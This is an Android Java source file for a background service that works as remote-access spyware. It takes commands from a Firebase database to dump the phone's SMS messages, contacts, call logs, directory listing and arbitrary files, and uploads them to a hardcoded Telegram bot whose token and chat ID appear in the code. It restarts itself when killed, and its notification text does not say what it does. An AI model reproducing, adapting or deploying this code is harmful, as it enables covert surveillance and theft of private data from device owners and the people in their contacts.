package com.sohaibazmi.remote;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;

import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.Uri;

import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.*;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class RemoteService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);

        startForegroundService();

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        FirebaseDatabase.getInstance().getReference("devices").child(deviceId).setValue("active");

        FirebaseDatabase.getInstance().getReference("commands").child(deviceId)
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot snapshot) {
                        String cmd = snapshot.getValue(String.class);
                        Log.d("REMOTE_CMD", "📥 Command: " + cmd);

                        if ("DUMP_MESSAGES".equalsIgnoreCase(cmd)) dumpSMS();
                        else if ("DUMP_CONTACTS".equalsIgnoreCase(cmd)) dumpContacts();
                        else if ("DUMP_CALL_LOGS".equalsIgnoreCase(cmd)) dumpCallLogs();
                        else if ("CHECK_CONNECTIVITY".equalsIgnoreCase(cmd)) checkConnectivityStatus();
                        else if ("LIST_DIR".equalsIgnoreCase(cmd)) listDirectoryStructure();
                        else if (cmd != null && cmd.startsWith("DUMP_FILE:")) {
                            String path = cmd.substring("DUMP_FILE:".length()).trim();
                            dumpFile(path);
                        }
                    }

                    @Override
                    public void onCancelled(DatabaseError error) {
                        Log.e("REMOTE_CMD", "❌ Firebase error", error.toException());
                    }
                });
    }

    private void startForegroundService() {
        String channelId = "remote_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "Remote Control", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("Remote Service")
                .setContentText("Let's deep Dive in Fun")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();

        startForeground(1, notification);
    }

    private void dumpFile(String path) {
        try {
            // Fix for missing storage root
            if (!path.startsWith("/storage")) {
                path = Environment.getExternalStorageDirectory().getAbsolutePath() + path;
            }

            File file = new File(path);
            if (file.exists() && file.canRead()) {
                sendTelegramFile(file);
                Log.d("REMOTE_CMD", "✅ File sent: " + path);
            } else {
                Log.e("REMOTE_CMD", "❌ File not accessible: " + path);
            }
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ dumpFile() error", e);
        }
    }



    private void dumpSMS() {
        File outputFile = new File(getExternalFilesDir(null), "sms_dump.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    writer.write(address + ": " + body);
                    writer.newLine();
                }
                cursor.close();
            }
            Log.d("REMOTE_CMD", "✅ SMS dumped to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ SMS dump failed", e);
        }
    }

    private void dumpContacts() {
        File outputFile = new File(getExternalFilesDir(null), "contacts_dump.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    writer.write(name + ": " + number);
                    writer.newLine();
                }
                cursor.close();
            }
            Log.d("REMOTE_CMD", "✅ Contacts dumped to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ Contacts dump failed", e);
        }
    }

    private void dumpCallLogs() {
        File outputFile = new File(getExternalFilesDir(null), "call_logs.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            Cursor cursor = getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    android.provider.CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
                    long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                    int duration = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));

                    String typeStr;
                    switch (type) {
                        case android.provider.CallLog.Calls.INCOMING_TYPE:
                            typeStr = "INCOMING";
                            break;
                        case android.provider.CallLog.Calls.OUTGOING_TYPE:
                            typeStr = "OUTGOING";
                            break;
                        case android.provider.CallLog.Calls.MISSED_TYPE:
                            typeStr = "MISSED";
                            break;
                        case android.provider.CallLog.Calls.REJECTED_TYPE:
                            typeStr = "REJECTED";
                            break;
                        default:
                            typeStr = "UNKNOWN";
                    }

                    String line = String.format("📞 %s | %s | %s | Duration: %ds",
                            (name != null ? name : "Unknown"), number, typeStr, duration);
                    writer.write(line);
                    writer.newLine();
                }
                cursor.close();
            }

            Log.d("REMOTE_CMD", "✅ Call logs dumped to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);

        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ Call log dump failed", e);
        }
    }

    private void checkConnectivityStatus() {
        boolean isConnected = false;

        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Network network = cm.getActiveNetwork();
                    NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
                    isConnected = capabilities != null &&
                            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
                } else {
                    NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                    isConnected = activeNetwork != null && activeNetwork.isConnected();
                }
            }
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ Connectivity check failed", e);
        }

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String statusMsg = isConnected ?
                "✅ Device " + deviceId + " is connected to the Internet." :
                "❌ Device " + deviceId + " is NOT connected to the Internet.";

        Log.d("REMOTE_CMD", statusMsg);
        sendTelegramText(statusMsg);
    }


    public static void sendTelegramText(String message) {
        String botToken = "8171904880:AAFICyJVYDyXGrcwrzjFgAJJqkiIi2zBIcE";
        String chatId = "6865050227";

        OkHttpClient client = new OkHttpClient();

        RequestBody requestBody = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", message)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + botToken + "/sendMessage")
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("TELEGRAM", "❌ Telegram text send failed", e);
            }

            @Override
            public void onResponse(Call call, Response response) {
                if (response.isSuccessful()) {
                    Log.d("TELEGRAM", "✅ Telegram text sent successfully");
                } else {
                    Log.e("TELEGRAM", "❌ Telegram text failed: " + response.message());
                }
            }
        });
    }

    public static boolean isInternetAvailable(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnected();
    }
    public static String getDeviceId(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private void listDirectoryStructure() {
        File rootDir = Environment.getExternalStorageDirectory(); // You can also use getExternalFilesDir(null)
        File outputFile = new File(getExternalFilesDir(null), "dir_structure.txt");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            writeDirectoryContents(writer, rootDir, 0);
            Log.d("REMOTE_CMD", "✅ Directory structure written to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);
        } catch (IOException e) {
            Log.e("REMOTE_CMD", "❌ Failed to list directory structure", e);
        }
    }

    private void writeDirectoryContents(BufferedWriter writer, File dir, int depth) throws IOException {
        if (dir == null || !dir.exists() || !dir.isDirectory()) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            for (int i = 0; i < depth; i++) writer.write("  ");
            writer.write((file.isDirectory() ? "[DIR] " : "- ") + file.getName());
            writer.newLine();

            if (file.isDirectory()) {
                writeDirectoryContents(writer, file, depth + 1);
            }
        }
    }


    private void sendTelegramFile(File file) {
        String botToken = "8171904880:AAFICyJVYDyXGrcwrzjFgAJJqkiIi2zBIcE";
        String chatId = "6865050227";

        if (file == null || !file.exists()) {
            Log.e("TELEGRAM", "❌ File does not exist: " + file.getAbsolutePath());
            return;
        }

        OkHttpClient client = new OkHttpClient();

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.getName(),
                        RequestBody.create(file, MediaType.parse("application/octet-stream")))
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + botToken + "/sendDocument")
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                Log.e("TELEGRAM", "❌ Telegram upload failed", e);
            }

            @Override
            public void onResponse(okhttp3.Call call, okhttp3.Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("TELEGRAM", "✅ File sent to Telegram: " + file.getName());
                } else {
                    Log.e("TELEGRAM", "❌ Telegram response error: " + response.message());
                }
            }
        });
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // auto-restart if killed
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);

        Intent broadcastIntent = new Intent(this, BootReceiver.class);
        sendBroadcast(broadcastIntent);
    }

}
